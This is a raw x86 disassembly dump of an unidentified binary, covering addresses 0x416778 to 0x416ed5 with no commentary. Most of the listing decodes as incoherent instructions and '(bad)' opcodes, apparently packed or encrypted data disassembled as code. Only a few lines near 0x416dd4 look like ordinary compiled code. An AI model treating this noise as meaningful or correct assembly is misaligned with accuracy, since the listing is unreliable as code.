  416778:	push   0x7de9eb09
  41677d:	in     al,0x95
  41677f:	nop
  416780:	(bad)  
  416781:	xchg   esi,eax
  416782:	out    dx,eax
  416783:	ficomp WORD PTR [edx+0x6d]
  416786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416787:	jmp    0x5c93:0xbc49099
  41678e:	cli    
  41678f:	xchg   esp,eax
  416790:	xor    DWORD PTR [edi-0x4b0be85d],esi
  416796:	adc    cl,BYTE PTR [ebx]
  416798:	in     eax,0x97
  41679a:	xchg   ebx,eax
  41679b:	add    eax,0x557aca87
  4167a0:	adc    BYTE PTR [eax],bl
  4167a2:	shl    BYTE PTR [edx-0x5],cl
  4167a5:	cdq    
  4167a6:	pop    edx
  4167a7:	mov    ds:0xe1b782d7,al
  4167ac:	inc    ecx
  4167ad:	popf   
  4167ae:	loop   0x416791
  4167b0:	mov    al,0xac
  4167b2:	lods   eax,DWORD PTR ds:[esi]
  4167b3:	add    esi,ebx
  4167b5:	pusha  
  4167b6:	pop    ebx
  4167b7:	ins    BYTE PTR es:[edi],dx
  4167b8:	mov    ch,0x23
  4167ba:	fbld   TBYTE PTR [eax+eax*8-0x1e]
  4167be:	jns    0x4167ad
  4167c0:	gs mov esi,0xe6968e4f
  4167c6:	sub    ecx,esp
  4167c8:	sub    edi,ecx
  4167ca:	mov    cl,0x1
  4167cc:	retf   
  4167cd:	mov    bl,0x94
  4167cf:	fwait
  4167d0:	push   ecx
  4167d1:	and    ebx,DWORD PTR [ebp+0x1]
  4167d4:	push   ebp
  4167d5:	fdiv   DWORD PTR [esi-0x69712fd8]
  4167db:	sbb    ebx,DWORD PTR ds:0x9b1172e0
  4167e1:	pop    esp
  4167e2:	or     eax,0x18b14e56
  4167e7:	jns    0x4167f8
  4167e9:	in     eax,0x2f
  4167eb:	ss inc eax
  4167ed:	fnsave [esi]
  4167ef:	pop    ds
  4167f0:	mov    ebx,0x8070a29d
  4167f5:	and    al,0xe3
  4167f7:	icebp  
  4167f8:	sar    DWORD PTR [ebp-0x4b],0x7
  4167fc:	sbb    eax,0x60221c85
  416801:	adc    esp,DWORD PTR [esp+eax*4]
  416804:	mov    bh,0x70
  416806:	push   cs
  416807:	ins    DWORD PTR es:[edi],dx
  416808:	leave  
  416809:	push   ecx
  41680a:	or     bl,BYTE PTR [ebp+0x1bf9104a]
  416810:	cli    
  416811:	gs in  al,0x19
  416814:	mov    edx,0x958d8a3c
  416819:	scas   al,BYTE PTR es:[edi]
  41681a:	jmp    0x1e7a:0x181712dc
  416821:	dec    ebx
  416822:	popa   
  416823:	push   esi
  416824:	adc    eax,0x4f67df62
  416829:	inc    ebx
  41682a:	xchg   ecx,eax
  41682b:	or     eax,DWORD PTR [esi]
  41682d:	loopne 0x416891
  41682f:	neg    BYTE PTR [ebx]
  416831:	cld    
  416832:	jnp    0x41688e
  416834:	and    BYTE PTR [esi+eax*2+0x1f],al
  416838:	(bad)  
  41683a:	sbb    DWORD PTR [ecx],esi
  41683c:	mov    ah,0x4a
  41683e:	loop   0x416807
  416840:	(bad)  
  416841:	in     al,dx
  416842:	mov    DWORD PTR [ebx+0x0],esp
  416845:	pop    es
  416846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416847:	popf   
  416848:	ins    DWORD PTR es:[edi],dx
  416849:	aam    0x86
  41684b:	aam    0x72
  41684d:	mov    ds:0xff7bba48,eax
  416852:	stos   DWORD PTR es:[edi],eax
  416853:	scas   al,BYTE PTR es:[edi]
  416854:	scas   eax,DWORD PTR es:[edi]
  416855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416856:	sub    al,0x91
  416858:	aam    0x66
  41685a:	sub    bl,bh
  41685c:	push   es
  41685d:	sub    edx,esi
  41685f:	in     al,dx
  416860:	aaa    
  416861:	dec    ecx
  416862:	mov    dl,0xca
  416864:	xchg   esi,eax
  416865:	test   eax,0xb8a64e70
  41686a:	adc    bh,BYTE PTR [edi+ebx*8-0x38]
  41686e:	push   edi
  41686f:	fs enter 0x1184,0x82
  416874:	push   eax
  416875:	jns    0x41687e
  416877:	push   eax
  416878:	sar    DWORD PTR ds:0x2e8eccf9,cl
  41687e:	pop    ds
  41687f:	inc    ecx
  416880:	dec    ebx
  416881:	or     dh,al
  416883:	pop    edi
  416884:	retf   0xdf84
  416887:	mov    ebp,0x94d37c45
  41688c:	and    dh,BYTE PTR [edi+ecx*2]
  41688f:	adc    BYTE PTR [ecx-0x4abd7d72],0xc0
  416896:	and    al,0x2d
  416898:	push   esp
  416899:	aad    0xf1
  41689b:	outs   dx,DWORD PTR ds:[esi]
  41689c:	js     0x41689b
  41689e:	jp     0x416894
  4168a0:	mov    es,WORD PTR [ecx]
  4168a2:	sahf   
  4168a3:	sbb    BYTE PTR ds:0x374c7afc,dl
  4168a9:	clc    
  4168aa:	ins    BYTE PTR es:[edi],dx
  4168ab:	cmp    al,0x5
  4168ad:	nop
  4168ae:	adc    BYTE PTR [edx+ebp*8+0x3d],ch
  4168b2:	pop    ebp
  4168b3:	out    0xa5,al
  4168b5:	cmp    BYTE PTR [edi+0x4e4ba5d4],0xf7
  4168bc:	push   DWORD PTR [eax-0x61]
  4168bf:	jecxz  0x416858
  4168c1:	(bad)  
  4168c2:	fidivr WORD PTR [ecx-0x23]
  4168c5:	cli    
  4168c6:	pop    ds
  4168c7:	pop    DWORD PTR [edi-0x76928cd9]
  4168cd:	or     dl,BYTE PTR ds:0xf1806b9b
  4168d3:	outs   dx,DWORD PTR ds:[esi]
  4168d4:	cs cs add DWORD PTR ds:[esi-0x32],0xfffffffd
  4168db:	dec    ebp
  4168dc:	xor    dh,0x6c
  4168df:	mov    bl,0xd4
  4168e1:	repz pusha 
  4168e3:	push   0x577f2a2b
  4168e8:	arpl   WORD PTR [ebx],bx
  4168ea:	pop    edi
  4168eb:	cmc    
  4168ec:	lods   eax,DWORD PTR ds:[esi]
  4168ed:	mov    BYTE PTR [eax+edx*1+0x7],dl
  4168f1:	mov    al,0x56
  4168f3:	and    BYTE PTR [ecx-0x9],0x72
  4168f7:	mov    BYTE PTR [ecx-0x78],bh
  4168fa:	out    0xb6,eax
  4168fc:	sub    dl,ah
  4168fe:	xchg   esp,eax
  4168ff:	test   al,0xef
  416901:	stos   BYTE PTR es:[edi],al
  416902:	sbb    al,0xff
  416904:	pop    eax
  416905:	xchg   ecx,eax
  416906:	and    DWORD PTR [esi+0x69324e08],ebp
  41690c:	xor    BYTE PTR [ecx+0x68],bh
  41690f:	test   al,0xdd
  416911:	popa   
  416912:	cmp    al,0x69
  416914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416915:	std    
  416916:	jp     0x416908
  416918:	add    DWORD PTR [edi-0x26],eax
  41691b:	jnp    0x4168bc
  41691d:	popa   
  41691e:	pop    ebp
  41691f:	sti    
  416920:	call   DWORD PTR [esi]
  416922:	ficom  DWORD PTR [edi]
  416924:	scas   al,BYTE PTR es:[edi]
  416925:	add    BYTE PTR [si],ch
  416928:	(bad)  
  416929:	iret   
  41692a:	sahf   
  41692b:	jl     0x41693b
  41692d:	(bad)  
  41692e:	scas   al,BYTE PTR es:[edi]
  41692f:	cdq    
  416930:	test   eax,0xa82cbcf8
  416935:	adc    DWORD PTR [ebp-0x3c],ebp
  416938:	mov    eax,ds:0x6aa4dec
  41693d:	leave  
  41693e:	clc    
  41693f:	or     DWORD PTR [edi+0x2],eax
  416942:	xor    DWORD PTR [edi+0x7efb83f2],esi
  416948:	fcom   QWORD PTR [eax-0x30c2a9b1]
  41694e:	xchg   ebx,eax
  41694f:	jnp    0x416997
  416951:	sub    dh,BYTE PTR ds:[esi+0x65]
  416955:	addr16 in eax,dx
  416957:	mov    edi,0xed32ded5
  41695c:	adc    eax,0xc353cf59
  416961:	fbld   TBYTE PTR [edx]
  416963:	sub    eax,0x9da880a5
  416968:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41696a:	xchg   edi,eax
  41696b:	cli    
  41696c:	arpl   bp,di
  41696e:	sbb    DWORD PTR [ecx+0x4a3c33ab],0xffffffba
  416975:	and    dh,BYTE PTR [ebx+0x5d]
  416978:	or     al,0xeb
  41697a:	(bad)  
  41697b:	test   DWORD PTR [ebx+ecx*8-0x4],ecx
  41697f:	ins    BYTE PTR es:[edi],dx
  416980:	jg     0x41691f
  416982:	stc    
  416983:	push   ds
  416984:	ds jb  0x4169b7
  416987:	neg    ch
  416989:	mov    ds:0xe95d79e0,al
  41698e:	ret    0x6e36
  416991:	js     0x4169cd
  416993:	stc    
  416994:	push   es
  416995:	inc    ebx
  416996:	sub    eax,DWORD PTR [ebp+0x2]
  416999:	jecxz  0x416a00
  41699b:	fbld   TBYTE PTR [ebp-0x65874f49]
  4169a1:	xchg   esp,eax
  4169a2:	or     BYTE PTR ds:[eax+0x4a6972a8],dl
  4169a9:	pusha  
  4169aa:	dec    eax
  4169ab:	mov    dh,BYTE PTR [eax+edi*4+0x76]
  4169af:	inc    eax
  4169b0:	cli    
  4169b1:	sub    eax,0xe1a42a80
  4169b6:	hlt    
  4169b7:	jecxz  0x416993
  4169b9:	xlat   BYTE PTR ds:[ebx]
  4169ba:	xchg   ebx,eax
  4169bb:	das    
  4169bc:	(bad)  
  4169bd:	aam    0x24
  4169bf:	inc    ebx
  4169c0:	in     al,dx
  4169c1:	sbb    eax,0x779e1c8d
  4169c6:	int3   
  4169c7:	scas   eax,DWORD PTR es:[edi]
  4169c8:	push   esi
  4169c9:	mov    edi,DWORD PTR [esi+0x30]
  4169cc:	push   edi
  4169cd:	cs jecxz 0x416a00
  4169d0:	arpl   WORD PTR [ecx-0x243b1e33],bx
  4169d6:	shl    BYTE PTR gs:[ecx],0x7f
  4169da:	loop   0x4169ed
  4169dc:	pop    esp
  4169dd:	repz fcomp QWORD PTR [edx-0x58]
  4169e1:	mov    eax,0xdc350ff9
  4169e6:	adc    edi,DWORD PTR [edi+0x5c]
  4169e9:	hlt    
  4169ea:	addr16 in eax,dx
  4169ec:	adc    eax,0xb7aefc57
  4169f1:	mov    al,0x94
  4169f3:	xchg   ebp,eax
  4169f4:	jg     0x416a06
  4169f6:	test   al,0x94
  4169f8:	(bad)  
  4169fa:	icebp  
  4169fb:	addr16 in al,0xfb
  4169fe:	cmp    dl,ch
  416a00:	mov    esi,0xd9cc8aa2
  416a05:	push   edi
  416a06:	imul   edi,DWORD PTR [ebx-0x5c],0xd36cfb97
  416a0d:	addr16 jno 0x416a2a
  416a10:	jbe    0x4169d6
  416a12:	mov    dh,dh
  416a14:	(bad)  
  416a15:	call   FWORD PTR [ecx]
  416a17:	je     0x416a72
  416a19:	pop    esi
  416a1a:	js     0x416a0b
  416a1c:	cmc    
  416a1d:	out    0xc9,eax
  416a1f:	and    edi,edi
  416a21:	and    eax,0x2258ab16
  416a26:	pop    ebp
  416a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a28:	sub    BYTE PTR [esi],bh
  416a2a:	adc    dl,ah
  416a2c:	(bad)  
  416a2d:	(bad)  
  416a2e:	icebp  
  416a2f:	xchg   DWORD PTR [eax],edi
  416a31:	dec    ebx
  416a32:	sub    BYTE PTR [ebx+0xbeb174f],ch
  416a38:	ret    0xa150
  416a3b:	fsub   DWORD PTR [edx]
  416a3d:	inc    edx
  416a3e:	add    BYTE PTR [edi-0x1],dl
  416a41:	xor    cl,ch
  416a43:	test   DWORD PTR [ebx],eax
  416a45:	add    BYTE PTR [eax],al
  416a47:	lock into 
  416a49:	ficomp DWORD PTR [edi]
  416a4b:	in     al,0x2f
  416a4d:	xor    al,0x15
  416a4f:	rcr    dl,cl
  416a51:	mov    ecx,0x5bce8c2f
  416a56:	xor    DWORD PTR [ecx],esi
  416a58:	ffreep st(1)
  416a5a:	mov    ebx,0xbbbbc590
  416a5f:	sbb    ah,BYTE PTR [ecx]
  416a61:	inc    edx
  416a62:	inc    eax
  416a63:	jo     0x4169f5
  416a65:	push   0xffffffc9
  416a67:	dec    esi
  416a68:	in     al,dx
  416a69:	adc    ah,bh
  416a6b:	in     al,0xb7
  416a6d:	mov    al,ds:0x4f5ea5a5
  416a72:	inc    ebx
  416a73:	call   FWORD PTR [edx-0x2fc62495]
  416a79:	lods   eax,DWORD PTR ds:[esi]
  416a7a:	fistp  WORD PTR [esi]
  416a7c:	xor    BYTE PTR [edi],dh
  416a7e:	sbb    eax,DWORD PTR [ebp+0x37]
  416a81:	fld    DWORD PTR [ecx+0x1e]
  416a84:	jae    0x416ae7
  416a86:	out    dx,al
  416a87:	jmp    0xb4bde64f
  416a8c:	xchg   dh,dl
  416a8e:	sub    edi,ebx
  416a90:	fdiv   QWORD PTR [ebp-0x2501de57]
  416a96:	sub    DWORD PTR [eax-0x1dfde886],esp
  416a9c:	cmp    eax,0xdff2e9d4
  416aa1:	std    
  416aa2:	add    ah,dh
  416aa4:	adc    al,0xb8
  416aa6:	cdq    
  416aa7:	cmp    bl,dl
  416aa9:	(bad)  [edx]
  416aab:	retf   0xaef7
  416aae:	dec    ebx
  416aaf:	pop    esi
  416ab0:	into   
  416ab1:	lahf   
  416ab2:	pop    ds
  416ab3:	xor    al,0x70
  416ab5:	test   BYTE PTR [edi+0x4],bl
  416ab8:	cmp    DWORD PTR [edx+esi*1-0x3c],esp
  416abc:	xor    bl,BYTE PTR [edi+esi*2+0x639d0ee0]
  416ac3:	sahf   
  416ac4:	(bad)  
  416ac5:	jae    0x416b16
  416ac7:	mov    edi,0x48dacc5d
  416acc:	sahf   
  416acd:	mov    ebp,0x25302116
  416ad2:	pop    ds
  416ad3:	or     ebx,0xdfd64d7e
  416ad9:	adc    al,0x59
  416adb:	add    ebx,esi
  416add:	sar    ebx,cl
  416adf:	(bad)  
  416ae0:	imul   DWORD PTR [eax+0x121a3103]
  416ae6:	add    DWORD PTR [ecx+0x17163321],eax
  416aec:	in     eax,dx
  416aed:	mov    bl,0x9e
  416aef:	int    0x86
  416af1:	js     0x416b13
  416af3:	mov    ds:0x4a19348e,eax
  416af8:	test   esp,esi
  416afa:	call   0xb4f7:0xc9b672a3
  416b01:	jno    0x416b07
  416b03:	retf   
  416b04:	dec    ebx
  416b06:	jle    0x416b33
  416b08:	stc    
  416b09:	xor    eax,0xe2abb35d
  416b0e:	jo     0x416b62
  416b10:	xchg   DWORD PTR [esi-0x66],edx
  416b13:	mov    ecx,eax
  416b15:	dec    edi
  416b16:	lods   eax,DWORD PTR ds:[esi]
  416b17:	inc    edi
  416b18:	ins    DWORD PTR es:[edi],dx
  416b19:	daa    
  416b1a:	(bad)  
  416b1b:	arpl   bp,cx
  416b1d:	cli    
  416b1e:	cmc    
  416b1f:	jne    0x416aad
  416b21:	fnstsw WORD PTR [ebx]
  416b23:	(bad)  
  416b25:	gs jp  0x416ad1
  416b28:	sti    
  416b29:	clc    
  416b2a:	shr    bh,0x4c
  416b2d:	jbe    0x416b8e
  416b2f:	pop    es
  416b30:	out    dx,al
  416b31:	or     DWORD PTR [edi-0x1],edi
  416b34:	push   ds
  416b35:	cmc    
  416b36:	retf   0x478f
  416b39:	clc    
  416b3a:	ror    bl,cl
  416b3c:	jae    0x416bb7
  416b3e:	fstp   TBYTE PTR [eax]
  416b40:	pop    ecx
  416b41:	jmp    0x416b67
  416b43:	jmp    0xc5380154
  416b48:	shr    DWORD PTR [ebx-0x75],0x34
  416b4c:	xor    BYTE PTR [edx-0x56],al
  416b4f:	and    ah,cl
  416b51:	and    al,0x60
  416b53:	mov    fs,WORD PTR [eax+0x2c]
  416b56:	and    ch,BYTE PTR [ebp*8+0x3f6fffab]
  416b5d:	fidiv  DWORD PTR [edx-0x41]
  416b60:	push   edx
  416b61:	test   al,0x44
  416b63:	adc    al,0x3d
  416b65:	addr16 data16 fs jbe 0x416b77
  416b6a:	(bad)  
  416b6b:	cmp    esi,edi
  416b6d:	xor    dh,bl
  416b6f:	ja     0x416b84
  416b71:	mov    edx,0xd365ef57
  416b76:	inc    ebp
  416b77:	xchg   ecx,eax
  416b78:	xchg   BYTE PTR [edx-0x76],cl
  416b7b:	dec    ebx
  416b7c:	fdiv   DWORD PTR [edi]
  416b7e:	mov    dl,0x57
  416b80:	xchg   si,ax
  416b82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b83:	inc    edi
  416b84:	aaa    
  416b85:	(bad)  [edi-0x34]
  416b88:	(bad)  
  416b89:	retf   0x1e72
  416b8c:	jb     0x416b73
  416b8e:	lods   al,BYTE PTR ds:[esi]
  416b8f:	cmc    
  416b90:	pop    esp
  416b91:	sub    dh,BYTE PTR [ebx+ebx*1-0x67]
  416b95:	cli    
  416b96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b97:	nop
  416b98:	pop    ebp
  416b99:	aas    
  416b9a:	mov    es,ecx
  416b9c:	jae    0x416b5f
  416b9e:	adc    BYTE PTR [edi+0x27],0x35
  416ba2:	sti    
  416ba3:	test   DWORD PTR [edx],0x52b8b91
  416ba9:	pop    edi
  416baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bab:	test   al,0x64
  416bad:	xchg   edi,eax
  416bae:	sbb    al,0xd6
  416bb0:	scas   eax,DWORD PTR es:[edi]
  416bb1:	pop    esp
  416bb2:	inc    ecx
  416bb3:	jle    0x416b56
  416bb5:	xor    BYTE PTR [bx+si-0x56],ah
  416bb9:	sub    edi,DWORD PTR [eax+ebp*4-0x4f]
  416bbd:	sub    al,0x70
  416bbf:	addr16 cmp eax,esi
  416bc2:	mov    edi,0xb0041dbb
  416bc7:	xor    eax,0x1d95d6b0
  416bcc:	sub    esp,edx
  416bce:	cmp    DWORD PTR [esi+0x12],esi
  416bd1:	xor    BYTE PTR [eax+edi*8+0x56111467],0xe
  416bd9:	jb     0x416c18
  416bdb:	dec    ebp
  416bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bdd:	cmp    bh,cl
  416bdf:	pop    es
  416be0:	or     BYTE PTR [edi+eiz*8],cl
  416be3:	xchg   ebp,eax
  416be4:	cmp    al,0x5e
  416be6:	std    
  416be7:	dec    ebx
  416be8:	sub    al,0xad
  416bea:	dec    ecx
  416beb:	jns    0x416c31
  416bed:	shrd   DWORD PTR [eax-0x327b701],edi,cl
  416bf4:	or     BYTE PTR [ebp+0x70],0xb6
  416bf8:	rcl    BYTE PTR [edi+0x4837bf1f],cl
  416bfe:	fcomp  DWORD PTR [edx]
  416c00:	inc    ecx
  416c01:	sahf   
  416c02:	(bad)  
  416c03:	push   ebx
  416c04:	pop    esi
  416c05:	mov    ah,0xc0
  416c07:	push   ss
  416c08:	mov    ebx,0xe62b8d3
  416c0d:	jne    0x416bc8
  416c0f:	dec    eax
  416c10:	cmp    dl,BYTE PTR [edi+0x2fa2b55a]
  416c16:	fild   WORD PTR [edx-0x4f]
  416c19:	xchg   BYTE PTR [esp+esi*2-0xe],bh
  416c1d:	or     dh,BYTE PTR [edi+0x9]
  416c20:	ja     0x416bf5
  416c22:	xchg   ebx,eax
  416c23:	cmp    esi,edx
  416c25:	or     al,0xcf
  416c27:	out    dx,al
  416c28:	mov    dl,0xce
  416c2a:	cmp    al,0xed
  416c2c:	test   DWORD PTR [esi+0x47],edi
  416c2f:	xchg   edi,eax
  416c30:	jp     0x416c32
  416c32:	std    
  416c33:	push   0xffffffa7
  416c35:	cmp    al,0x8b
  416c37:	aad    0x41
  416c39:	xchg   esp,eax
  416c3a:	addr16 icebp 
  416c3c:	gs xor al,0xb1
  416c3f:	dec    ebx
  416c40:	mov    al,ds:0x636b7419
  416c45:	push   ds
  416c46:	pop    edx
  416c47:	punpckldq mm4,DWORD PTR [ebp+0x14737a18]
  416c4e:	idiv   BYTE PTR [ebp+0x21]
  416c51:	sub    eax,0x7cd8fd2
  416c56:	into   
  416c57:	pusha  
  416c58:	xchg   ecx,eax
  416c59:	in     eax,dx
  416c5a:	(bad)  
  416c5b:	ss fwait
  416c5d:	xchg   ch,bh
  416c5f:	adc    al,0xb1
  416c61:	mov    ch,BYTE PTR [eax+0x5d]
  416c64:	fwait
  416c65:	xlat   BYTE PTR ds:[ebx]
  416c66:	mov    al,0x87
  416c68:	adc    al,0xad
  416c6a:	mov    eax,0xaefbec34
  416c6f:	and    DWORD PTR [eax-0x6cc6e2f1],0xffffff92
  416c76:	inc    edi
  416c77:	sbb    BYTE PTR [eax+esi*2+0x252cbc66],bh
  416c7e:	dec    edx
  416c7f:	(bad)  
  416c80:	push   cs
  416c81:	ja     0x416cb7
  416c83:	mov    al,0x4d
  416c85:	ins    DWORD PTR es:[edi],dx
  416c86:	mov    esi,0x61ecec6c
  416c8b:	lods   eax,DWORD PTR ds:[esi]
  416c8c:	push   ebp
  416c8d:	adc    BYTE PTR ds:0x23af9839,cl
  416c93:	lds    eax,FWORD PTR [esi-0x22d2f50]
  416c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c9a:	shl    BYTE PTR [edi+edi*8+0x3df4a94f],0x7c
  416ca2:	test   DWORD PTR [esi],eax
  416ca4:	dec    ecx
  416ca5:	jo     0x416c34
  416ca7:	jae    0x416ce3
  416ca9:	outs   dx,BYTE PTR ds:[esi]
  416caa:	adc    bl,BYTE PTR [edi-0x63942f73]
  416cb0:	xchg   esp,eax
  416cb1:	pop    edx
  416cb2:	xchg   esi,eax
  416cb3:	sub    al,0xf2
  416cb5:	mov    ebp,0xad71774e
  416cba:	fs jmp 0xaef9:0x81871a64
  416cc2:	cs out dx,al
  416cc4:	outs   dx,DWORD PTR ds:[esi]
  416cc5:	int    0xc8
  416cc7:	inc    eax
  416cc8:	fstp   QWORD PTR [ebx+0x718dfb0e]
  416cce:	mov    al,ds:0xeb7b0c0d
  416cd3:	imul   edi,DWORD PTR [edi+0x628deff1],0xfbd503ac
  416cdd:	fidivr DWORD PTR [ebx+0x7bc582be]
  416ce3:	jg     0x416c6f
  416ce5:	stos   DWORD PTR es:[edi],eax
  416ce6:	mov    eax,ds:0x3996b35e
  416ceb:	popf   
  416cec:	add    DWORD PTR [eax+0x76a567f2],ebp
  416cf2:	lds    ax,DWORD PTR [eax-0x10]
  416cf6:	xor    BYTE PTR [ebx],al
  416cf8:	mov    bl,BYTE PTR [bp+di-0x25]
  416cfc:	sti    
  416cfd:	add    BYTE PTR [edx+0x58d8320d],bl
  416d03:	retf   0xb0c3
  416d06:	inc    ebp
  416d07:	pop    ebp
  416d08:	xchg   cl,ah
  416d0a:	jmp    0x416d18
  416d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d0d:	mov    cl,0x58
  416d0f:	ss into 
  416d11:	mov    bh,0xa1
  416d13:	push   ebp
  416d14:	push   es
  416d15:	push   edx
  416d16:	push   cs
  416d17:	cmp    bh,bh
  416d19:	out    dx,al
  416d1a:	bound  edx,QWORD PTR [ebx-0x4]
  416d1d:	and    al,0xdf
  416d1f:	xchg   esp,eax
  416d20:	sub    eax,0x457a8fba
  416d25:	push   edi
  416d26:	and    BYTE PTR [ebx],bl
  416d28:	xor    BYTE PTR [ebx-0x5e],0x83
  416d2c:	popa   
  416d2d:	xchg   edx,eax
  416d2e:	add    eax,0x65007cb5
  416d33:	fcmovb st,st(1)
  416d35:	shl    DWORD PTR [edx+0x3fa5db0c],cl
  416d3b:	or     al,BYTE PTR [edx-0x694ccd27]
  416d41:	mov    al,0x28
  416d43:	pop    edi
  416d44:	call   0xfaf99847
  416d49:	push   esp
  416d4a:	add    cl,bl
  416d4c:	lea    ecx,[esi-0x6a]
  416d4f:	pop    esi
  416d50:	sub    al,0xe9
  416d52:	in     eax,0xe
  416d54:	mov    cl,0xa4
  416d56:	ins    DWORD PTR es:[edi],dx
  416d57:	scas   eax,DWORD PTR es:[edi]
  416d58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d59:	adc    al,cl
  416d5b:	push   cs
  416d5c:	call   0xb372:0x2d4cf656
  416d63:	mov    fs,WORD PTR [edx+ebp*2]
  416d66:	xchg   edi,eax
  416d67:	and    esp,DWORD PTR ds:0x7374d2b5
  416d6d:	mov    ah,0xcb
  416d6f:	push   edx
  416d70:	out    dx,eax
  416d71:	jmp    0x7cde24c
  416d76:	jp     0x416cff
  416d78:	adc    BYTE PTR [esi],al
  416d7a:	jno    0x416d65
  416d7c:	inc    edi
  416d7d:	ret    0xb8ac
  416d80:	xor    dh,dl
  416d82:	mov    BYTE PTR [eax+esi*1],dl
  416d85:	add    edi,eax
  416d87:	rcr    dh,0xa0
  416d8a:	and    eax,0xcd280823
  416d8f:	mov    ah,0x58
  416d91:	inc    edi
  416d92:	jmp    0x416dde
  416d94:	xchg   ebx,eax
  416d95:	fst    QWORD PTR [ecx]
  416d97:	ret    0x47e8
  416d9a:	inc    ebx
  416d9b:	push   cs
  416d9c:	imul   ebp,DWORD PTR [esi+ebp*2-0x22038363],0xf7d3ec15
  416da7:	mov    cl,0x2c
  416da9:	and    al,0xbe
  416dab:	sti    
  416dac:	inc    ebx
  416dad:	push   cs
  416dae:	add    ebp,DWORD PTR [eax-0x68fd9ed0]
  416db4:	bound  eax,QWORD PTR [ebp-0x747c7ab8]
  416dba:	pop    ebx
  416dbb:	jnp    0x416dcb
  416dbd:	lods   eax,DWORD PTR ds:[esi]
  416dbe:	push   cs
  416dbf:	cld    
  416dc0:	mov    esp,0xa4b01722
  416dc5:	lods   al,BYTE PTR ds:[esi]
  416dc6:	add    edx,edi
  416dc8:	in     al,dx
  416dc9:	js     0x416e29
  416dcb:	ffreep st(1)
  416dcd:	loope  0x416ded
  416dcf:	call   0x41d6cc
  416dd4:	mov    eax,DWORD PTR [ebp-0x3c]
  416dd7:	mov    eax,DWORD PTR [ebp-0x2c]
  416dda:	mov    edi,DWORD PTR [ebp-0x24]
  416ddd:	mov    eax,DWORD PTR [ebp-0x30]
  416de0:	mov    ecx,edi
  416de2:	mov    DWORD PTR [ebp-0x1c],eax
  416de5:	jmp    0x41716f
  416dea:	scas   al,BYTE PTR es:[edi]
  416deb:	int    0xb8
  416ded:	jge    0x416da7
  416def:	mov    ebp,0x16800daf
  416df4:	add    eax,0xe204d871
  416df9:	outs   dx,DWORD PTR ds:[esi]
  416dfa:	(bad)  
  416dfb:	out    0xc1,eax
  416dfd:	mov    ebx,0xbbbbc590
  416e02:	icebp  
  416e03:	out    0x66,eax
  416e05:	push   ebx
  416e06:	in     eax,0xfc
  416e08:	pop    edx
  416e09:	sub    al,0xc3
  416e0b:	fidiv  WORD PTR [edx+ecx*1-0x5e8c3ace]
  416e12:	and    BYTE PTR [edi+0x29],0x76
  416e16:	add    cl,BYTE PTR [esi-0x6e70a81a]
  416e1c:	test   eax,0xce0e9959
  416e21:	add    BYTE PTR [edx],bl
  416e23:	rcl    DWORD PTR [ecx],1
  416e25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e26:	mov    dl,BYTE PTR [ecx+0x6c]
  416e29:	or     DWORD PTR [ebp+0x61],ecx
  416e2c:	clc    
  416e2d:	scas   eax,DWORD PTR es:[edi]
  416e2e:	test   al,0x64
  416e30:	(bad)  
  416e31:	fdivr  QWORD PTR [esi+0x5d31e4d4]
  416e37:	and    ecx,DWORD PTR [eax+0x2f9094d6]
  416e3d:	ret    
  416e3e:	lea    edi,ds:0x20a998e6
  416e44:	scas   al,BYTE PTR es:[edi]
  416e45:	mov    esi,0xe8126838
  416e4a:	inc    eax
  416e4b:	fisttp DWORD PTR [eax-0xdb54849]
  416e51:	imul   BYTE PTR [edi]
  416e53:	out    dx,al
  416e54:	retf   0xb74d
  416e57:	hlt    
  416e58:	test   BYTE PTR [ebp-0x6d3082c4],bh
  416e5e:	cld    
  416e5f:	in     eax,0x6a
  416e61:	fcmovu st,st(5)
  416e63:	xlat   BYTE PTR ds:[ebx]
  416e64:	mov    dl,0xf6
  416e66:	or     edi,DWORD PTR [edx-0x7256aaad]
  416e6c:	mov    eax,0x1d736a91
  416e71:	push   0x2e77aae
  416e76:	sub    BYTE PTR [esi+ebx*4],dh
  416e79:	out    dx,al
  416e7a:	ret    
  416e7b:	add    cl,al
  416e7d:	mov    ss,WORD PTR [ebx]
  416e7f:	or     BYTE PTR ds:0xdce63ae4,cl
  416e85:	retf   
  416e86:	dec    ecx
  416e87:	stos   DWORD PTR es:[edi],eax
  416e88:	sti    
  416e89:	adc    al,0x8f
  416e8b:	aas    
  416e8c:	repnz scas al,BYTE PTR es:[edi]
  416e8e:	and    edx,DWORD PTR [ebx-0x6]
  416e91:	aas    
  416e92:	push   cs
  416e93:	cwde   
  416e94:	repnz push ds
  416e96:	push   es
  416e97:	in     al,0x36
  416e99:	jno    0x416e55
  416e9b:	pop    esp
  416e9c:	sub    esi,ebx
  416e9e:	adc    ah,BYTE PTR [ebx]
  416ea0:	loop   0x416ea1
  416ea2:	push   esi
  416ea3:	and    DWORD PTR [eax],eax
  416ea5:	xlat   BYTE PTR ds:[ebx]
  416ea6:	pop    ebx
  416ea7:	out    0x72,eax
  416ea9:	mov    ebp,0xed9934ce
  416eae:	imul   ebp,DWORD PTR [ebx-0x6166c450],0x66
  416eb5:	mov    cs,WORD PTR [ebx+0x28]
  416eb8:	mov    bl,0xe
  416eba:	dec    edx
  416ebb:	int3   
  416ebc:	ret    0x96d
  416ebf:	inc    edi
  416ec0:	xchg   esi,eax
  416ec1:	jg     0x416f15
  416ec3:	dec    eax
  416ec4:	das    
  416ec5:	shl    DWORD PTR [edi],0xb0
  416ec8:	cs add al,0xc9
  416ecb:	cmp    esi,edx
  416ecd:	fidivr WORD PTR [eax+0x74]
  416ed0:	fstp   DWORD PTR [esi]
  416ed2:	mov    bl,0x3a
  416ed4:	scas   al,BYTE PTR es:[edi]
  416ed5:	sbb    ecx,ebx
